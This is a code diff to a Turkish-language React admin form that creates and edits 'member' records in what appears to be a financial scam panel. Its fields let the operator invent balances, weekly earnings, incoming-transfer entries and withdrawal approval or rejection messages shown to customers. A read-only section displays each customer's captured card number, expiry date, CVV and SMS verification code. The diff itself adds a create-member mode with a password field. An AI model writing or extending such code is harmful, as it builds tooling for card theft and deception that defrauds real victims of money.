@@ -18,52 +18,38 @@ type AdminMemberFormProps = {
 };
 
 const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => {
-    const [formData, setFormData] = useState<Omit<AdminMember, 'id' | 'password'>>({
-        name: '',
-        phone: '',
-        iban: '',
-        bank: '',
-        tc: '',
-        il: '',
-        ilce: '',
-        weeklyGain: '',
-        errorMessage: '',
-        onayMesaji: '',
-        invoiceAmount: '',
-        accountActivity: '',
-        meetingInfo: '',
-        currentBalance: '',
-        status: 'Aktif',
-        transactionStatus: 'allowed',
-        cardNumber: '',
-        cardExpiry: '',
-        cardCvv: '',
-        smsCode: '',
-    });
+    const isEditMode = !!member;
+    const [formData, setFormData] = useState<Partial<AdminMember>>({});
 
      useEffect(() => {
         if (member) {
             setFormData({
-                name: member.name || '',
+                ...member,
                 phone: member.phone, // email is stored in phone field
-                iban: member.iban || '',
-                bank: member.bank || '',
-                tc: member.tc || '',
-                il: member.il || '',
-                ilce: member.ilce || '',
-                weeklyGain: member.weeklyGain || '',
-                errorMessage: member.errorMessage || 'İşlem sırasında bir hata oluştu. Lütfen destek ekibiyle iletişime geçin.',
-                onayMesaji: member.onayMesaji || 'İşleminiz başarıyla alındı.',
-                invoiceAmount: member.invoiceAmount || '',
-                accountActivity: member.accountActivity || '',
-                meetingInfo: member.meetingInfo || '',
-                currentBalance: member.currentBalance || '0 TL',
                 status: member.status || 'Aktif',
                 transactionStatus: member.transactionStatus || 'allowed',
-                cardNumber: member.cardNumber || '',
-                cardExpiry: member.cardExpiry || '',
-                cardCvv: member.cardCvv || '',
-                smsCode: member.smsCode || '',
+                errorMessage: member.errorMessage || 'İşlem sırasında bir hata oluştu. Lütfen destek ekibiyle iletişime geçin.',
+                onayMesaji: member.onayMesaji || 'İşleminiz başarıyla alındı.',
+            });
+        } else {
+             setFormData({
+                name: '',
+                phone: '',
+                password: '',
+                iban: '',
+                bank: '',
+                tc: '',
+                il: '',
+                ilce: '',
+                weeklyGain: '',
+                errorMessage: 'İşlem sırasında bir hata oluştu. Lütfen destek ekibiyle iletişime geçin.',
+                onayMesaji: 'İşleminiz başarıyla alındı.',
+                invoiceAmount: '',
+                accountActivity: '',
+                meetingInfo: '',
+                currentBalance: '0 TL',
+                status: 'Aktif',
+                transactionStatus: 'allowed',
             });
         }
     }, [member]);
@@ -84,9 +70,7 @@ const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => 
 
     const handleSubmit = (e: React.FormEvent) => {
         e.preventDefault();
-        if (member) {
-            onSave({ ...member, ...formData });
-        }
+        onSave(formData as AdminMember);
     };
     
     return (
@@ -94,43 +78,49 @@ const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => 
             <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                  <div className="space-y-2">
                     <Label htmlFor="phone">Email (Giriş Adresi)</Label>
-                    <Input id="phone" value={formData.phone} disabled readOnly />
+                    <Input id="phone" value={formData.phone || ''} onChange={handleChange} type="email" placeholder="ornek@alanadi.com" required disabled={isEditMode} />
                 </div>
+                {!isEditMode && (
+                  <div className="space-y-2">
+                      <Label htmlFor="password">Şifre</Label>
+                      <Input id="password" value={formData.password || ''} onChange={handleChange} type="password" placeholder="En az 6 karakter" required />
+                  </div>
+                )}
                  <div className="space-y-2">
                     <Label htmlFor="name">Ad Soyad</Label>
-                    <Input id="name" value={formData.name} onChange={handleChange} placeholder="Ad Soyad" required />
+                    <Input id="name" value={formData.name || ''} onChange={handleChange} placeholder="Ad Soyad" required />
                 </div>
                  <div className="space-y-2">
                     <Label htmlFor="tc">TC Kimlik No</Label>
-                    <Input id="tc" value={formData.tc} onChange={handleChange} placeholder="TC Kimlik No" required />
+                    <Input id="tc" value={formData.tc || ''} onChange={handleChange} placeholder="TC Kimlik No" required />
                 </div>
                  <div className="space-y-2">
                     <Label htmlFor="bank">Banka</Label>
-                    <Input id="bank" value={formData.bank} onChange={handleChange} placeholder="Banka Adı" required />
+                    <Input id="bank" value={formData.bank || ''} onChange={handleChange} placeholder="Banka Adı" required />
                 </div>
                 <div className="space-y-2">
                     <Label htmlFor="iban">IBAN</Label>
-                    <Input id="iban" value={formData.iban} onChange={handleChange} placeholder="TR..." required />
+                    <Input id="iban" value={formData.iban || ''} onChange={handleChange} placeholder="TR..." required />
                 </div>
                  <div className="space-y-2">
                     <Label htmlFor="il">İl</Label>
-                    <Input id="il" value={formData.il} onChange={handleChange} placeholder="İl" required />
+                    <Input id="il" value={formData.il || ''} onChange={handleChange} placeholder="İl" required />
                 </div>
                  <div className="space-y-2">
                     <Label htmlFor="ilce">İlçe</Label>
-                    <Input id="ilce" value={formData.ilce} onChange={handleChange} placeholder="İlçe" required />
+                    <Input id="ilce" value={formData.ilce || ''} onChange={handleChange} placeholder="İlçe" required />
                 </div>
                  <div className="space-y-2">
                     <Label htmlFor="weeklyGain">Haftalık Kazanç</Label>
-                    <Input id="weeklyGain" value={formData.weeklyGain} onChange={handleChange} placeholder="Örn: 1500 TL" required />
+                    <Input id="weeklyGain" value={formData.weeklyGain || ''} onChange={handleChange} placeholder="Örn: 1500 TL" required />
                 </div>
                 <div className="space-y-2">
                     <Label htmlFor="invoiceAmount">Fatura Tutarı</Label>
-                    <Input id="invoiceAmount" value={formData.invoiceAmount} onChange={handleChange} placeholder="Örn: 1250 TL" required />
+                    <Input id="invoiceAmount" value={formData.invoiceAmount || ''} onChange={handleChange} placeholder="Örn: 1250 TL" required />
                 </div>
                 <div className="space-y-2">
                     <Label htmlFor="currentBalance">Mevcut Bakiye</Label>
-                    <Input id="currentBalance" value={formData.currentBalance} onChange={handleChange} placeholder="Örn: 2500 TL" required />
+                    <Input id="currentBalance" value={formData.currentBalance || ''} onChange={handleChange} placeholder="Örn: 2500 TL" required />
                 </div>
                 <div className="space-y-3">
                     <Label>Üyelik Durumu</Label>
@@ -168,45 +158,48 @@ const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => 
                 </div>
                  <div className="space-y-2 sm:col-span-2">
                     <Label htmlFor="onayMesaji">Onay Mesajı</Label>
-                    <Textarea id="onayMesaji" value={formData.onayMesaji} onChange={handleChange} placeholder="Para çekme onaylandığında müşteriye gösterilecek mesaj..." required />
+                    <Textarea id="onayMesaji" value={formData.onayMesaji || ''} onChange={handleChange} placeholder="Para çekme onaylandığında müşteriye gösterilecek mesaj..." required />
                 </div>
                  <div className="space-y-2 sm:col-span-2">
                     <Label htmlFor="errorMessage">Hata Mesajı</Label>
-                    <Textarea id="errorMessage" value={formData.errorMessage} onChange={handleChange} placeholder="Para çekme engellendiğinde müşteriye gösterilecek mesaj..." required />
+                    <Textarea id="errorMessage" value={formData.errorMessage || ''} onChange={handleChange} placeholder="Para çekme engellendiğinde müşteriye gösterilecek mesaj..." required />
                 </div>
                  <div className="space-y-2 sm:col-span-2">
                     <Label htmlFor="accountActivity">Hesap Hareketi</Label>
-                    <Textarea id="accountActivity" value={formData.accountActivity} onChange={handleChange} placeholder="Müşterinin bakiye sayfasında görünecek hesap hareketi bilgisi (örn: Gelen Transfer: 500 TL)..." />
+                    <Textarea id="accountActivity" value={formData.accountActivity || ''} onChange={handleChange} placeholder="Müşterinin bakiye sayfasında görünecek hesap hareketi bilgisi (örn: Gelen Transfer: 500 TL)..." />
                 </div>
                 <div className="space-y-2 sm:col-span-2">
                     <Label htmlFor="meetingInfo">Görüşme Planlayıcı Notu</Label>
-                    <Textarea id="meetingInfo" value={formData.meetingInfo} onChange={handleChange} placeholder="Görüşme planlayıcı sayfasında gösterilecek ek bilgi..." />
+                    <Textarea id="meetingInfo" value={formData.meetingInfo || ''} onChange={handleChange} placeholder="Görüşme planlayıcı sayfasında gösterilecek ek bilgi..." />
                 </div>
             </div>
 
-            <Separator className="my-4" />
-            
-            <div className="space-y-4">
-                 <h3 className="text-lg font-medium text-muted-foreground">Müşteri Kart Bilgileri (Salt Okunur)</h3>
-                 <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
-                    <div className="space-y-2">
-                        <Label htmlFor="cardNumber">Kart Numarası</Label>
-                        <Input id="cardNumber" value={formData.cardNumber} readOnly disabled />
+            {isEditMode && (
+                <>
+                    <Separator className="my-4" />
+                    <div className="space-y-4">
+                         <h3 className="text-lg font-medium text-muted-foreground">Müşteri Kart Bilgileri (Salt Okunur)</h3>
+                         <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
+                            <div className="space-y-2">
+                                <Label htmlFor="cardNumber">Kart Numarası</Label>
+                                <Input id="cardNumber" value={formData.cardNumber || ''} readOnly disabled />
+                            </div>
+                             <div className="space-y-2">
+                                <Label htmlFor="cardExpiry">Son Kullanma Tarihi</Label>
+                                <Input id="cardExpiry" value={formData.cardExpiry || ''} readOnly disabled />
+                            </div>
+                             <div className="space-y-2">
+                                <Label htmlFor="cardCvv">CVV</Label>
+                                <Input id="cardCvv" value={formData.cardCvv || ''} readOnly disabled />
+                            </div>
+                             <div className="space-y-2">
+                                <Label htmlFor="smsCode">SMS Kodu</Label>
+                                <Input id="smsCode" value={formData.smsCode || ''} readOnly disabled />
+                            </div>
+                         </div>
                     </div>
-                     <div className="space-y-2">
-                        <Label htmlFor="cardExpiry">Son Kullanma Tarihi</Label>
-                        <Input id="cardExpiry" value={formData.cardExpiry} readOnly disabled />
-                    </div>
-                     <div className="space-y-2">
-                        <Label htmlFor="cardCvv">CVV</Label>
-                        <Input id="cardCvv" value={formData.cardCvv} readOnly disabled />
-                    </div>
-                     <div className="space-y-2">
-                        <Label htmlFor="smsCode">SMS Kodu</Label>
-                        <Input id="smsCode" value={formData.smsCode} readOnly disabled />
-                    </div>
-                 </div>
-            </div>
+                </>
+            )}
 
 
             <DialogFooter>
